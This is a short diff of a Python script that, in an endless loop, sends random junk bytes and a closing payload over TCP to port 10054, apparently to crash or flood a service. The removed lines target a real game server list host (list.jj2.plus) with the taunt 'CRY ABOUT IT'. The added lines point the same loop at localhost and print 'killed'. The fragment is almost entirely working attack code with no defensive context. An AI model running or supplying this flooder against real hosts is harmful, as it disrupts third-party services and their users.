@@ -12,12 +12,12 @@ while True:
         x[i + 1] = ord(chr(i + random.randint(1, 4))) ^ random.randint(0, 255)
 
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    sock.connect(("list.jj2.plus", 10054))
+    sock.connect(("localhost", 10054))
     sock.send(x)
     time.sleep(1)
-    sock.send(b"CRY ABOUT IT")
+    sock.send(b"\x00")
     sock.close()
 
-    print("cried about it")
+    print("killed")
 
     time.sleep(0)
